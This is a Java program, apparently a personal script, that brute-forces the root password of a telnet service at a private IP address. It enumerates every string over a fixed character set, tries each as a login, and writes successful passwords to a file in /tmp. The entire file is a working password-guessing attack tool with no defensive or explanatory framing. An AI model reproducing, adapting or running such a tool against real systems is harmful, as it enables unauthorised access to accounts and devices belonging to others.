import java.io.FileNotFoundException;
import java.io.PrintStream;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class Main {

    private static PrintStream successPasswords;
    private static PrintStream errPasswords;

    static {
        try {
            successPasswords = new PrintStream("/tmp/successPasswords.txt");
            errPasswords = new PrintStream("/tmp/errPasswords.txt");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void logSuccessPasswords(String arg){
        successPasswords.println(arg);
        successPasswords.flush();
    }

    private static void logErrPasswords(String arg){
        errPasswords.println(arg);
        errPasswords.flush();
    }

    private static Boolean tryLogin(String passwd) {
        try {
            AutomatedTelnetClient atc = new AutomatedTelnetClient("192.168.187.216", "root", passwd, "\n", true);
            String ans = atc.readUntil("Login incorrect", false);

            if (!ans.contains("Login incorrect")) {
                System.out.println("PAVYKO: " + passwd);
                logSuccessPasswords("Successful login wit: " + passwd);
            }
            atc.disconnect();
            return ans.contains("Login incorrect");
        } catch (Exception e) {
            logErrPasswords("error getting login with password: " + passwd);
            e.printStackTrace();
        }
        return false;
    }

    static char[] chars = {'!', '!', '~', '@', '#', '_', '^', '&', '*', '(', ')', '%', '/', '.', '+', ':', ';', '=', '$', ' ',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
            , 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'Z'
            // 'o','o', 'p'
    };
    static int length = chars.length;

    private static String numberToPassword(long arg) {
        int rem;
        String res = "";
        long num = arg;

        do {
            rem = (int) num %  length;
            num = num / length;
            res = Character.toString(chars[rem]) + res;
        } while (num > 0);

        if (arg % 10 == 0) {
             System.out.print(".");
        }
        if (arg % 1000 == 0) {
            System.out.print("\n" + arg + " of passwords tested. " + res + "    |");
        }
        return res;
    }

    public static void main(String[] args) {
        Stream<Long> infiniteStream = Stream.iterate(0L, i -> i + 1L);
        infiniteStream.map(Main::numberToPassword).map(Main::tryLogin).collect(Collectors.toList());
    }
}
